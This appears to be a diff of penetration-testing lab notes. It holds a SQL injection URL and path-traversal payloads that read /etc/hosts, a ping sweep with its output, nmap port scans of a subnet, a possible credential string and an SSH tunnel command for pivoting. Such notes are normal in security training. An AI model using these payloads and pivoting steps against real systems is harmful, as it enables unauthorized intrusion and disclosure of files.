@@ -127,3 +127,64 @@ http://127.0.0.1:21600/forces/forcespick.php?Locations=4%20UNION%20SELECT%20on_h
 http://127.0.0.1:21600/Onlinetools/lookup.php?myfile=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts&submit=Web+Site+listings
 
 /../../../../../../../../../../../etc/hosts
+
+
+22222222222222222222222222222222222222222222222222222222222222222222222222
+22222222222222222222222222222222222222222222222222222222222222222222222222
+PART 2     22222222222222222222222222222222222222222222222222222222222222222222222222
+22222222222222222222222222222222222222222222222222222222222222222222222222
+22222222222222222222222222222222222222222222222222222222222222222222222222
+
+
+
+
+
+
+for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+
+
+64 bytes from 192.168.28.1: icmp_seq=1 ttl=64 time=1.24 ms
+
+64 bytes from 192.168.28.5: icmp_seq=1 ttl=127 time=2.26 ms
+64 bytes from 192.168.28.10: icmp_seq=1 ttl=63 time=1.15 ms
+64 bytes from 192.168.28.19: icmp_seq=1 ttl=63 time=1.42 ms
+
+64 bytes from 192.168.28.161: icmp_seq=1 ttl=64 time=0.157 ms
+64 bytes from 192.168.28.177: icmp_seq=1 ttl=63 time=0.465 ms
+64 bytes from 192.168.28.182: icmp_seq=1 ttl=63 time=0.435 ms
+
+
+
+
+Nmap scan report for 192.168.28.5
+Host is up (0.0012s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap scan report for 192.168.28.10
+Host is up (0.0012s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 192.168.28.19
+Host is up (0.0011s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+
+
+
+R_and_D_Nix2
+ssh -p21600 -MS /tmp/t1 Kmichae@127.0.0.1
+
+
+
+
+
